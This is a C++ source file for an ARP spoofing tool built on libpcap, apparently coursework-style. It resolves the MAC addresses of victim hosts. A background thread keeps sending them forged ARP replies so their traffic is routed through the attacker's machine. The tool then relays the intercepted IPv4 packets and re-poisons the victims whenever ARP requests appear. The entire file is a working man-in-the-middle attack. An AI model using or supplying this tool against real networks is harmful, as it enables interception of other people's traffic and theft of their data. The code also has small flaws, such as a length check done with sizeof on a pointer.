#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <ifaddrs.h>
#include <unistd.h>
#include <algorithm>
#include <map>
#include <thread>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct IP_MAC{
    Ip sip_;
    Ip tip_;
    Mac mac_;
};


void usage() {
    printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int get_my_MAC(Mac *result, char *interface_name){
    char filename[100] = "/sys/class/net/";
    if(sizeof(interface_name) > 80){
        fprintf(stderr, "interface name is too long\n");
        return -1;
    }
    strcat(filename, interface_name);
    strncat(filename, "/address", 9);
    FILE *my_net_file = fopen(filename, "rt");
    char addr[18];
    int ret = fscanf(my_net_file, "%s", addr);
    if(ret == EOF){
        fprintf(stderr, "cannot find address file");
        return -1;
    }
    *result = Mac(addr);
    return 0;
}

int get_my_IP(Ip *result, char *interface_name){
    struct ifaddrs *myaddrs;
    int ret = getifaddrs(&myaddrs);
    if(ret == EOF){
        fprintf(stderr, "cannot find my ip addr");
        return -1;
    }
    struct ifaddrs *tmp = myaddrs;
    while(tmp){
        if(strcmp(tmp->ifa_name, interface_name) == 0 && tmp->ifa_addr->sa_family == AF_INET){
            break;
        }
        tmp = tmp->ifa_next;
    }
    if(!tmp){
        fprintf(stderr, "cannot find interface");
        return -1;
    }
    sockaddr_in *myaddr = (sockaddr_in *)(tmp->ifa_addr);
    *result = Ip(ntohl(myaddr->sin_addr.s_addr));
    return 0;
}

int sendARP_req(pcap_t *handle, Mac smac, Ip sip, Ip tip){
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }
    return 0;
}

int sendARP_reply(pcap_t *handle, Mac dmac, Mac smac, Ip sip, Ip tip){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(dmac);
    packet.eth_.smac_ = Mac(smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = Mac(dmac);
    packet.arp_.tip_ = htonl(tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }
    return 0;
}

int resolve_mac(Mac *result, pcap_t *handle, Mac smac, Ip sip, Ip tip){
    int res = sendARP_req(handle, smac, sip, tip);
    if(res != 0){
        fprintf(stderr, "req error\n");
        return -1;
    }
    PEthHdr ethernet;
    PArpHdr arp;
    int count = 0;
    while (count < 10) {
        struct pcap_pkthdr *header;
        const u_char *packet;
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        ethernet = (PEthHdr)packet;
        if(ethernet->type() != EthHdr::Arp) continue;
        arp = (PArpHdr)(packet + sizeof(*ethernet));
        if(arp->op() != ArpHdr::Reply) continue;
        if(arp->sip() == Ip(tip)){
            *result = arp->smac();
            return 0;
        }
        count++;
        sendARP_req(handle, smac, sip, tip);
    }
    fprintf(stderr, "couldn't find ARP reply in 10 sequence");
    return -1;
}

void ARPInfect(pcap_t *handle, Mac *sender_addr_Mac, Mac attackerMac, std::map<Mac, IP_MAC> senderMac_target_Map, unsigned int len){
    while(1){
        for(unsigned int i=0;i<len;i++){
            sendARP_reply(handle, sender_addr_Mac[i], attackerMac, senderMac_target_Map[sender_addr_Mac[i]].tip_, senderMac_target_Map[sender_addr_Mac[i]].sip_);
        }
        sleep(5);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

    char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

    Mac attacker_mac;
    Ip attacker_ip;

    int ret;

    ret = get_my_MAC(&attacker_mac, dev);
    if (ret != 0){
        fprintf(stderr, "couldn't find my MAC\n");
        return -1;
    }

    ret = get_my_IP(&attacker_ip, dev);
    if (ret != 0){
        fprintf(stderr, "couldn't find my IP\n");
        return -1;
    }

    Mac *sender_addr_Mac;
    sender_addr_Mac = new Mac[(argc-2) / 2];
    std::map<Mac, IP_MAC> senderMac_target_Map;

    for(int i=0;i<argc-2;i++){
        IP_MAC target;
        if (i%2 == 0){
            ret = resolve_mac(sender_addr_Mac+i/2, handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
            if (ret != 0){
                fprintf(stderr, "couldn't find Mac addr of %s\n", argv[i+2]);
                return -1;
            }
            target.sip_ = Ip(argv[i+2]);
        }
        else{
            ret = resolve_mac(&(target.mac_), handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
            if (ret != 0){
                fprintf(stderr, "couldn't find Mac addr of %s\n", argv[i+2]);
                return -1;
            }
            target.tip_ = Ip(argv[i+2]);
            senderMac_target_Map.insert(std::pair<Mac, IP_MAC>(sender_addr_Mac[i/2], target));
        }
    }

    std::thread t1(ARPInfect, handle, sender_addr_Mac, attacker_mac, senderMac_target_Map, (argc-2)/2);

    PEthHdr ethernet;
    PArpHdr arp;

    struct pcap_pkthdr *header;
    const u_char *packet;
    u_char *tmpPacket;
    Mac *p;

    while(1){
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        ethernet = (PEthHdr)packet;
        p = std::find(sender_addr_Mac, sender_addr_Mac+(argc-2)/2, ethernet->smac());
        if(p == sender_addr_Mac+(argc-2)/2) continue;
        if(ethernet->type() == EthHdr::Ip4){
            tmpPacket = new u_char[header->caplen];
            memcpy(tmpPacket, packet, header->caplen);
            ethernet = (PEthHdr)tmpPacket;
            ethernet->dmac_ = senderMac_target_Map[ethernet->smac()].mac_;
            ethernet->smac_ = attacker_mac;
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(tmpPacket), header->caplen);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            delete[] tmpPacket;

        } else if (ethernet->type() == EthHdr::Arp){
            arp = (PArpHdr)(packet + sizeof(*ethernet));
            if (arp->op() != ArpHdr::Request) continue;
            sendARP_reply(handle, *p, attacker_mac, senderMac_target_Map[arp->smac()].tip_, arp->sip());
        }
    }

    delete[] sender_addr_Mac;
    pcap_close(handle);
}




